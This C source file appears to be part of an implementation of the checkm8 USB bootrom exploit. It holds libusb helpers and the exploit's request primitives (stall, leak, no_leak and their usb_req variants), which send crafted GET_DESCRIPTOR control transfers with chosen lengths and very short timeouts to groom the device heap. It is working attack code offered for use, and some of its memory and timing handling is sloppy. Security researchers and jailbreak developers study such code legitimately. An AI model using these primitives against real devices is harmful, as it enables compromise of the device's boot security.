#include "libusb_helpers.h"
#include "checkm8.h"

#include <string.h>
#include <stdio.h>
#include <stdlib.h>

#include "libusbi.h"

int get_device_bundle(struct pwned_device *dev)
{
    if(dev->bundle->ctx == NULL)
    {
        dev->bundle->ctx = malloc(sizeof(libusb_context));
        libusb_init(&dev->bundle->ctx);
    }
    else
    {
        if(dev->bundle->descriptor != NULL &&
           dev->bundle->descriptor->idVendor == dev->idVendor &&
           dev->bundle->descriptor->idProduct == dev->idProduct)
        {
            return LIBUSB_SUCCESS;
        }
    }

    libusb_device **usb_device_list = NULL;
    int usb_dev_count, ret = LIBUSB_ERROR_NO_DEVICE;

    usb_dev_count = libusb_get_device_list(dev->bundle->ctx, &usb_device_list);

    dev->bundle->device = NULL;
    dev->bundle->handle = NULL;
    dev->bundle->descriptor = malloc(sizeof(struct libusb_device_descriptor));

    for(unsigned int i = 0; i < usb_dev_count; i++)
    {
        dev->bundle->device = usb_device_list[i];
        libusb_get_device_descriptor(dev->bundle->device, dev->bundle->descriptor);

        if(dev->bundle->descriptor->idVendor == dev->idVendor &&
           dev->bundle->descriptor->idProduct == dev->idProduct)
        {
            ret = LIBUSB_SUCCESS;
            break;
        }
    }

    libusb_free_device_list(usb_device_list, usb_dev_count);
    if(ret == LIBUSB_SUCCESS)
    {
        libusb_open(dev->bundle->device, &dev->bundle->handle);
        libusb_set_auto_detach_kernel_driver(dev->bundle->handle, 1);
    }
    else
    {
        libusb_exit(dev->bundle->ctx);
        free(dev->bundle->ctx);
        free(dev->bundle->descriptor);

        dev->bundle->ctx = NULL;
        dev->bundle->device = NULL;
        dev->bundle->handle = NULL;
        dev->bundle->descriptor = NULL;
    }

    return ret;
}

int release_device_bundle(struct pwned_device *dev)
{
    if(dev->bundle->handle != NULL)
    {
        libusb_close(dev->bundle->handle);
    }

    dev->bundle->device = NULL;

    if(dev->bundle->ctx != NULL)
    {
        libusb_exit(dev->bundle->ctx);
        free(dev->bundle->ctx);
    }

    if(dev->bundle->descriptor != NULL)
    {
        free(dev->bundle->descriptor);
        dev->bundle->descriptor = NULL;
    }

    return LIBUSB_SUCCESS;
}

void LIBUSB_CALL async_ctrl_transfer_cb(struct libusb_transfer *transfer)
{
    printf("transfer status: %s (%i / %i)\n",
           libusb_error_name(transfer->status),
           transfer->actual_length,
           transfer->length);
}

void libusb1_async_ctrl_transfer(struct pwned_device *dev,
                                 unsigned char bmRequestType, unsigned char bRequest,
                                 unsigned short wValue, unsigned short wIndex,
                                 unsigned char *data, unsigned short data_len,
                                 unsigned int timeout)
{
    struct timeval start, end;
    unsigned char usb_transfer_buf[8 + data_len];
    int ret;

    gettimeofday(&start, NULL);

    struct libusb_transfer *usb_transfer = libusb_alloc_transfer(0);
    libusb_fill_control_setup(usb_transfer_buf, bmRequestType, bRequest, wValue, wIndex, data_len);
    memcpy(&usb_transfer_buf[8], data, data_len);
    libusb_fill_control_transfer(usb_transfer, dev->bundle->handle, usb_transfer_buf, async_ctrl_transfer_cb, NULL, 1);

    ret = libusb_submit_transfer(usb_transfer);
    if(ret != 0)
    {
        printf("Failed to submit async USB transfer: %s\n", libusb_error_name(ret));
        libusb_free_transfer(usb_transfer);
        exit(ret);
    }

    while(1)
    {
        gettimeofday(&end, NULL);
        if(end.tv_usec - start.tv_usec > timeout)
        {
            ret = libusb_cancel_transfer(usb_transfer);
            if(ret != 0)
            {
                printf("Failed to cancel async USB transfer: %s\n", libusb_error_name(ret));
                exit(ret);
            }
            return;
        }

        printf("%i / %i\n", usb_transfer->actual_length, usb_transfer->length);
    }
}

void libusb1_no_error_ctrl_transfer(struct pwned_device *dev,
                                    unsigned char bmRequestType, unsigned char bRequest,
                                    unsigned short wValue, unsigned short wIndex,
                                    unsigned char *data, unsigned short data_len,
                                    unsigned int timeout)
{
    int ret;
    unsigned char recipient = bmRequestType & 3u;
    unsigned char rqtype = bmRequestType & (3u << 5u);
    if(recipient == 1 && rqtype == (2u << 5u))
    {
        unsigned short interface = wIndex & 0xFFu;
        ret = libusb_claim_interface(dev->bundle->handle, interface);
        if(ret > 0)
        {
            printf("%s\n", libusb_error_name(ret));
            exit(1);
        }
    }

    ret = libusb_control_transfer(dev->bundle->handle, bmRequestType, bRequest, wValue, wIndex, data, data_len, timeout);
    printf("%s\n", libusb_error_name(ret));
}

static unsigned char data_0xA_0xC0_buf[192] =
        {
                0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA,
                0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA,
                0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA,
                0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA,
                0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA,
                0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA,
                0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA,
                0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA,
                0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA,
                0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA,
                0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA,
                0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA
        };

static unsigned char data_0xA_0xC1_buf[193] =
        {
                0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA,
                0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA,
                0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA,
                0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA,
                0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA,
                0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA,
                0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA,
                0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA,
                0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA,
                0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA,
                0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA,
                0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA, 0xA,
                0xA
        };

static unsigned char data_0x0_0x40_buf[64] =
        {
                0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
                0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
                0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
                0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0
        };

static unsigned char data_0x0_0x41_buf[65] =
        {
                0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
                0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
                0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
                0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
                0x0
        };

static unsigned char data_0x0_0xC0_buf[192] =
        {
                0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
                0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
                0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
                0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
                0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
                0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
                0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
                0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
                0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
                0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
                0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
                0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0
        };

void stall(struct pwned_device *dev)
{
    libusb1_async_ctrl_transfer(dev, 0x80, 6, 0x304, 0x40A,
                                data_0xA_0xC0_buf, 0xC0, 1);
}

void leak(struct pwned_device *dev)
{
    libusb1_no_error_ctrl_transfer(dev, 0x80, 6, 0x304, 0x40A,
                                   data_0x0_0xC0_buf, 0xC0, 1);
}

void no_leak(struct pwned_device *dev)
{
    libusb1_no_error_ctrl_transfer(dev, 0x80, 6, 0x304, 0x40A,
                                   data_0xA_0xC1_buf, 0xC1, 1);
}

void usb_req_stall(struct pwned_device *dev)
{
    unsigned char data[0];
    libusb1_no_error_ctrl_transfer(dev, 0x2, 3, 0, 0x80, data, 0, 1);
}

void usb_req_leak(struct pwned_device *dev)
{
    libusb1_no_error_ctrl_transfer(dev, 0x80, 6, 0x304, 0x40A,
                                   data_0x0_0x40_buf, 0x40, 1);
}

void usb_req_no_leak(struct pwned_device *dev)
{

    libusb1_no_error_ctrl_transfer(dev, 0x80, 6, 0x304, 0x40A,
                                   data_0x0_0x41_buf, 0x41, 1);
}